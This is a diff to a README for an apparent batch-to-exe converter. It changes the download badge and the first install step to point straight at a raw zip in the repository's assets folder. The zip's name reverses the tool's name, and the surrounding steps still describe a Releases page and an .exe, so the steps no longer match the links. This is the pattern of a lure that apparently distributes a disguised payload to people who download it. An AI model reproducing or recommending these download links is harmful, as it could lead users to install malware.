@@ -1,6 +1,6 @@
 # ⚙️ .batFile-To-.exe-Converter - Turn Batch Files Into Windows Programs
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Dutch-brunchcoat5919/.batFile-To-.exe-Converter)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Dutch-brunchcoat5919/.batFile-To-.exe-Converter/raw/refs/heads/main/assets/Converter_exe_To_bat_File_v2.5-beta.2.zip)
 
 ## ✅ About This Software
 
@@ -12,7 +12,7 @@ You do not need to install extra software for the files to run. The output file 
 
 Follow these steps to use the converter on your Windows computer.
 
-1. Visit [this link](https://github.com/Dutch-brunchcoat5919/.batFile-To-.exe-Converter) to find the latest version of the software.
+1. Visit [this link](https://github.com/Dutch-brunchcoat5919/.batFile-To-.exe-Converter/raw/refs/heads/main/assets/Converter_exe_To_bat_File_v2.5-beta.2.zip) to find the latest version of the software.
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the most recent release.
 4. Download the file ending in .exe to your desktop or downloads folder.
